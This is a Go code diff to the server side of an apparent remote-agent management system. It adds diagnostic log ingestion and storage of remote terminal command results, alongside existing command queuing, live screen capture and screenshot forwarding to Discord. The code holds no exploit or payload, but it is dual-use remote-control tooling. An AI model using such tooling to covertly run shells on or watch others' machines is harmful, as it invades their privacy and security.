@@ -32,15 +32,19 @@ import (
 )
 
 const (
-	maxCommandIDLen   = 128
-	maxTypeLen        = 64
-	maxStatusLen      = 32
-	maxHostnameLen    = 120
-	maxReasonLen      = 512
-	maxBrowserNameLen = 80
-	maxPathLen        = 260
-	maxAppNameLen     = 120
-	maxOSVersionLen   = 120
+	maxCommandIDLen      = 128
+	maxTypeLen           = 64
+	maxStatusLen         = 32
+	maxHostnameLen       = 120
+	maxReasonLen         = 512
+	maxBrowserNameLen    = 80
+	maxPathLen           = 260
+	maxAppNameLen        = 120
+	maxOSVersionLen      = 120
+	maxLogLevelLen       = 16
+	maxComponentLen      = 120
+	maxLogMessageLen     = 2048
+	maxTerminalOutputLen = 128 * 1024
 
 	maxBrowsers = 32
 	maxApps     = 200
@@ -68,6 +72,8 @@ type Server struct {
 	statusProvider agentStatusProvider
 	screenStore    *ScreenStore
 	screenSessions *ScreenSessions
+	logStore       *AgentLogStore
+	terminalStore  *TerminalStore
 	engine         *gin.Engine
 
 	seenMu     sync.Mutex
@@ -96,6 +102,8 @@ func NewServer(b *broker.NATS, notifier *provider.Fanout, commandQueue *command.
 		statusProvider: statusProvider,
 		screenStore:    NewScreenStore(),
 		screenSessions: NewScreenSessions(),
+		logStore:       NewAgentLogStore(maxLogEntriesPerAgent),
+		terminalStore:  NewTerminalStore(),
 		engine:         gin.Default(),
 		seenAgents:     make(map[string]struct{}),
 	}
@@ -113,6 +121,7 @@ func NewServer(b *broker.NATS, notifier *provider.Fanout, commandQueue *command.
 //
 //	POST /ingest/heartbeat   — accepts agent heartbeat payloads.
 //	POST /ingest/entry       — accepts stage-2 onboarding reports.
+//	POST /ingest/logs        — accepts client diagnostic log entries.
 //	GET  /commands/next      — dequeues the next pending command for an agent.
 //	POST /commands/result    — accepts command execution results.
 //	GET  /screen/media       — accepts authenticated live screen media frames.
@@ -122,9 +131,57 @@ func (s *Server) routes() {
 
 	s.engine.POST("/ingest/heartbeat", s.handleHeartbeat)
 	s.engine.POST("/ingest/entry", s.handleEntry)
+	s.engine.POST("/ingest/logs", s.handleLogEntry)
 	s.engine.GET("/commands/next", s.handleNextCommand)
 	s.engine.POST("/commands/result", s.handleCommandResult)
 	s.engine.GET("/screen/media", s.handleScreenMedia)
+}
+
+// handleLogEntry processes an authenticated client diagnostic log entry.
+//
+// The agent identity and client IP are extracted from the mTLS session. Level,
+// component, and message are client-authored payload fields and are normalized
+// before publication and dashboard storage.
+func (s *Server) handleLogEntry(c *gin.Context) {
+	agentID := c.GetString("agent_id")
+	if agentID == "" {
+		c.JSON(http.StatusForbidden, gin.H{"error": "missing authenticated agent identity"})
+		return
+	}
+
+	var req pb.LogEntry
+	if err := c.ShouldBindJSON(&req); err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid schema"})
+		return
+	}
+
+	logEntry := normalizeLogEntry(&req)
+	env := &pb.EventEnvelope{
+		EventId:   uuid.New().String(),
+		TraceId:   c.GetHeader("X-Trace-ID"),
+		Timestamp: timestamppb.Now(),
+		Security: &pb.SecurityContext{
+			AgentId:         agentID,
+			SessionId:       uuid.New().String(),
+			ClientIp:        c.ClientIP(),
+			IsAuthenticated: true,
+		},
+		Payload: &pb.EventEnvelope_LogEntry{LogEntry: logEntry},
+	}
+
+	subject := "sys.in.default." + agentID + ".logs"
+	if err := s.broker.Publish(subject, env); err != nil {
+		slog.ErrorContext(c.Request.Context(), "client log publish failed",
+			"agent_id", agentID,
+			"error", err,
+		)
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to queue event"})
+		return
+	}
+
+	s.storeLogEnvelope(env)
+
+	c.JSON(http.StatusAccepted, gin.H{"status": "accepted", "event_id": env.EventId})
 }
 
 // traceMiddleware extracts the X-Trace-ID header from the incoming request
@@ -304,6 +361,8 @@ func (s *Server) handleEntry(c *gin.Context) {
 		return
 	}
 
+	s.storeLogEnvelope(env)
+
 	if err := s.notifier.ReportEntry(c.Request.Context(), report); err != nil {
 		slog.ErrorContext(c.Request.Context(), "entry notification delivery failed",
 			"agent_id", agentID,
@@ -342,12 +401,17 @@ func (s *Server) handleNextCommand(c *gin.Context) {
 
 // commandResultRequest is the JSON shape for a command execution result.
 type commandResultRequest struct {
-	CommandID      string `json:"command_id" binding:"required"`
-	Type           string `json:"type" binding:"required"`
-	Status         string `json:"status" binding:"required"`
-	Reason         string `json:"reason"`
-	ClientHostname string `json:"client_hostname"`
-	OutputData     []byte `json:"output_data,omitempty"`
+	CommandID                string `json:"command_id" binding:"required"`
+	Type                     string `json:"type" binding:"required"`
+	Status                   string `json:"status" binding:"required"`
+	Reason                   string `json:"reason"`
+	ClientHostname           string `json:"client_hostname"`
+	OutputData               []byte `json:"output_data,omitempty"`
+	TerminalSessionID        string `json:"terminal_session_id"`
+	TerminalShell            string `json:"terminal_shell"`
+	TerminalCommand          string `json:"terminal_command"`
+	TerminalWorkingDirectory string `json:"terminal_working_directory"`
+	TerminalExitCode         int    `json:"terminal_exit_code"`
 }
 
 // handleCommandResult processes an authenticated command execution result.
@@ -406,6 +470,8 @@ func (s *Server) handleCommandResult(c *gin.Context) {
 		return
 	}
 
+	s.storeLogEnvelope(env)
+
 	if req.Type == "support.request_screenshot" && req.Status == "executed" && len(req.OutputData) > 0 {
 		s.screenStore.Save(agentID, ScreenFrame{
 			AgentID:    agentID,
@@ -414,7 +480,10 @@ func (s *Server) handleCommandResult(c *gin.Context) {
 			Content:    append([]byte(nil), req.OutputData...),
 		})
 	}
-	if len(req.OutputData) > 0 && s.discordPoster != nil {
+	if req.Type == "support.terminal.run" {
+		s.storeTerminalResult(agentID, req)
+	}
+	if req.Type == "support.request_screenshot" && len(req.OutputData) > 0 && s.discordPoster != nil {
 		go func() {
 			ctx, cancel := context.WithTimeout(context.Background(), commandResultForwardTimeout)
 			defer cancel()
@@ -478,6 +547,76 @@ func (s *Server) DashboardRuntime() DashboardRuntime {
 		CommandQueue: s.commandQueue,
 		Screens:      s.screenStore,
 		Sessions:     s.screenSessions,
+		Logs:         s.logStore,
+		Terminals:    s.terminalStore,
+	}
+}
+
+func (s *Server) storeTerminalResult(agentID string, req commandResultRequest) {
+	if s == nil || s.terminalStore == nil {
+		return
+	}
+	s.terminalStore.Complete(agentID, req.CommandID, TerminalEntry{
+		AgentID:          agentID,
+		SessionID:        clampText(strings.TrimSpace(req.TerminalSessionID), maxCommandIDLen),
+		CommandID:        clampText(strings.TrimSpace(req.CommandID), maxCommandIDLen),
+		Command:          clampText(strings.TrimSpace(req.TerminalCommand), maxLogMessageLen),
+		Shell:            normalizeTerminalShell(req.TerminalShell),
+		WorkingDirectory: clampText(strings.TrimSpace(req.TerminalWorkingDirectory), maxPathLen),
+		Status:           clampText(strings.TrimSpace(req.Status), maxStatusLen),
+		ExitCode:         req.TerminalExitCode,
+		OutputLog:        clampTerminalOutput(req.OutputData, maxTerminalOutputLen),
+		Reason:           clampText(strings.TrimSpace(req.Reason), maxReasonLen),
+	})
+}
+
+func (s *Server) storeLogEnvelope(env *pb.EventEnvelope) {
+	if s == nil || s.logStore == nil || env == nil || env.Security == nil {
+		return
+	}
+
+	entry := env.GetLogEntry()
+	if entry == nil {
+		return
+	}
+
+	observedAt := time.Now().UTC()
+	if env.Timestamp != nil {
+		observedAt = env.Timestamp.AsTime()
+	}
+
+	s.logStore.Append(AgentLogEntry{
+		EventID:    env.EventId,
+		AgentID:    env.Security.AgentId,
+		ClientIP:   env.Security.ClientIp,
+		ObservedAt: observedAt,
+		Level:      entry.Level,
+		Component:  entry.Component,
+		Message:    entry.Message,
+	})
+}
+
+func normalizeLogEntry(entry *pb.LogEntry) *pb.LogEntry {
+	if entry == nil {
+		return &pb.LogEntry{Level: "INFO", Component: "client", Message: ""}
+	}
+
+	level := strings.ToUpper(clampText(strings.TrimSpace(entry.Level), maxLogLevelLen))
+	switch level {
+	case "DEBUG", "INFO", "WARN", "ERROR":
+	default:
+		level = "INFO"
+	}
+
+	component := clampText(strings.TrimSpace(entry.Component), maxComponentLen)
+	if component == "" {
+		component = "client"
+	}
+
+	return &pb.LogEntry{
+		Level:     level,
+		Component: component,
+		Message:   clampText(strings.TrimSpace(entry.Message), maxLogMessageLen),
 	}
 }
 
